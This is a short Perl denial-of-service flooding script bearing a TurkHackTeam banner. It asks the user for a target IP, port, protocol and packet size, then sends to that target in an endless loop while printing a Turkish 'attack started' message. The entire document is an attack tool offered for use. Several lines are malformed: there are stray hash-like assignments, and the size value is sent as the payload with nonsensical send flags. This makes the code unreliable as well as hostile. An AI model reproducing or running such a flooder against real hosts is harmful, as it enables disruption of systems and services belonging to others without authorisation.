#!/usr/bin/perl

print q{
=================================================
=                                               =
=               Coding By Scoobyy               =
=                                               =
=                                               =
=                                               =
=                                               =
=                                               =
=              www.TurkHackTeam.org             =
=                                               =
=================================================

};

use IO::Socket::INET;

print "IP: -> ";
chop ($host = <stdin>);
print "PORT: -> ";
chop ($port = <stdin>);
print "Saldiri Sekli TCP / UDP: -> ";
chop ($protocol = <stdin>);
print "Paket Boyutu: -> ";
chop ($size = <stdin>);

{
$sock = IO::Socket::INET->new (
  PeerAddr => $host,
  PeerPort => $port,
  Proto => $protocol) 
        || die "the IP or PORT is incorrect, please check the IP and PORT";
}
Paketler:
while (1) {
size => $size;
$Reuse => 1,
$Listen => 1,
print ("$host:$port Saldiri Baslatildi: $size\n");
send($sock, $size, $Reuse, $Listen);
} 
